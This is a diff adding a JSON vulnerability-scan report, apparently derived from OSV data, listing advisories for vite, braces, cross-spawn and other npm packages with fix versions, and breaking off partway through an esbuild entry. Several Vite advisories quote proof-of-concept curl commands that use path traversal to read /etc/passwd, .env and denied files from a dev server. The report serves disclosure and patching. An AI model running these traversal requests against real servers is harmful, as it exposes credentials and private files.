@@ -1,0 +1,2254 @@
+{
+  "analyzedAt": "2025-12-17T20:07:21.683Z",
+  "source": "Quorafind__Obsidian-Table-Generator.osv.json",
+  "summary": {
+    "totalVulnerabilities": 26,
+    "uniqueVulnerabilities": 26,
+    "affectedPackages": 13,
+    "stalePackages": 26,
+    "stalePackagesOldFix": 19,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 5,
+      "LOW": 21
+    },
+    "recentVulnerabilities": 4,
+    "hasFixAvailable": 26
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-356w-63v5-8wf4",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-32395"
+      ],
+      "summary": "Vite has an `server.fs.deny` bypass with an invalid `request-target`",
+      "details": "### Summary\nThe contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun.\n\n### Impact\nOnly apps with the following conditions are affected.\n\n- explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun)\n\n### Details\n\n[HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)).\n\nOn Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check.\n\nOn Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. \n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\nsend request to read `/etc/passwd`\n```\ncurl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173\n```",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-04-11T14:06:03Z",
+        "modifiedDate": "2025-04-11T14:06:03Z",
+        "daysSincePublished": 250
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "6.2.6",
+        "recommendation": "Upgrade to 6.2.6 or later",
+        "fixAvailableSince": "2025-04-11T14:06:03.000Z",
+        "daysSinceFix": 250,
+        "monthsSinceFix": 8,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32395"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-859w-5945-r5v3",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-46565"
+      ],
+      "summary": "Vite's server.fs.deny bypassed with /. for files under project root",
+      "details": "### Summary\nThe contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\nOnly files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.\n\n- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`\n- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`\n\n### Details\n[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).\nThese patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).\n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env/. http://localhost:5173\n```\n\n![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b)\n![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)",
+      "cwes": [
+        {
+          "id": "CWE-22",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-04-30T17:40:27Z",
+        "modifiedDate": "2025-05-02T15:33:47Z",
+        "daysSincePublished": 231
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "6.3.4",
+        "recommendation": "Upgrade to 6.3.4 or later",
+        "fixAvailableSince": "2025-05-02T15:33:47.000Z",
+        "daysSinceFix": 229,
+        "monthsSinceFix": 7,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-46565"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/c22c43de612eebb6c182dd67850c24e4fab8cacb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-93m4-6634-74q7",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-62522"
+      ],
+      "summary": "vite allows server.fs.deny bypass via backslash on Windows",
+      "details": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
+      "cwes": [
+        {
+          "id": "CWE-22",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-10-20T19:54:28Z",
+        "modifiedDate": "2025-10-21T14:51:26Z",
+        "daysSincePublished": 58
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "7.1.11",
+        "recommendation": "Upgrade to 7.1.11 or later",
+        "fixAvailableSince": "2025-10-21T14:51:26.000Z",
+        "daysSinceFix": 57,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62522"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-g4jq-h2w9-997c",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-58751"
+      ],
+      "summary": "Vite middleware may serve files starting with the same name with the public directory",
+      "details": "### Summary\nFiles starting with the same name with the public directory were served bypassing the `server.fs` settings.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\n\n### Details\nThe [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-22",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-09-09T20:55:56Z",
+        "modifiedDate": "2025-09-09T21:42:24.933704Z",
+        "daysSincePublished": 98
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "7.1.5",
+        "recommendation": "Upgrade to 7.1.5 or later",
+        "fixAvailableSince": "2025-09-09T21:42:24.933Z",
+        "daysSinceFix": 98,
+        "monthsSinceFix": 3,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58751"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-jqfw-vq24-v9c3",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-58752"
+      ],
+      "summary": "Vite's `server.fs` settings were not applied to HTML files",
+      "details": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" > /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-23",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-09-09T20:54:42Z",
+        "modifiedDate": "2025-09-09T21:42:25.007022Z",
+        "daysSincePublished": 98
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "7.1.5",
+        "recommendation": "Upgrade to 7.1.5 or later",
+        "fixAvailableSince": "2025-09-09T21:42:25.007Z",
+        "daysSinceFix": 98,
+        "monthsSinceFix": 3,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58752"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-5889"
+      ],
+      "summary": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-06-09T21:30:51Z",
+        "modifiedDate": "2025-06-11T20:54:10Z",
+        "daysSincePublished": 190
+      },
+      "affected": {
+        "package": "brace-expansion",
+        "version": "1.1.11",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.1.11",
+        "fixedIn": "2.0.2",
+        "recommendation": "Upgrade to 2.0.2 or later",
+        "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+        "daysSinceFix": 188,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.585717"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-grv7-fg5c-xmjg",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-4068"
+      ],
+      "summary": "Uncontrolled resource consumption in braces",
+      "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+      "cwes": [
+        {
+          "id": "CWE-1050",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-05-14T18:30:54Z",
+        "modifiedDate": "2024-07-15T22:12:28.795792Z",
+        "daysSincePublished": 582
+      },
+      "affected": {
+        "package": "braces",
+        "version": "3.0.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.0.2",
+        "fixedIn": "3.0.3",
+        "recommendation": "Upgrade to 3.0.3 or later",
+        "fixAvailableSince": "2024-07-15T22:12:28.795Z",
+        "daysSinceFix": 519,
+        "monthsSinceFix": 17,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/issues/35"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/pull/37"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/pull/40"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
+        },
+        {
+          "type": "WEB",
+          "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/micromatch/braces"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3xgq-45jj-v275",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-21538"
+      ],
+      "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+      "details": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-11-08T06:30:47Z",
+        "modifiedDate": "2025-05-19T19:56:26Z",
+        "daysSincePublished": 404
+      },
+      "affected": {
+        "package": "cross-spawn",
+        "version": "7.0.3",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.0.3",
+        "fixedIn": "7.0.5",
+        "recommendation": "Upgrade to 7.0.5 or later",
+        "fixAvailableSince": "2025-05-19T19:56:26.000Z",
+        "daysSinceFix": 212,
+        "monthsSinceFix": 7,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/moxystudio/node-cross-spawn"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-67mh-4wv8-2f99",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [],
+      "summary": "esbuild enables any website to send any requests to the development server and read the response",
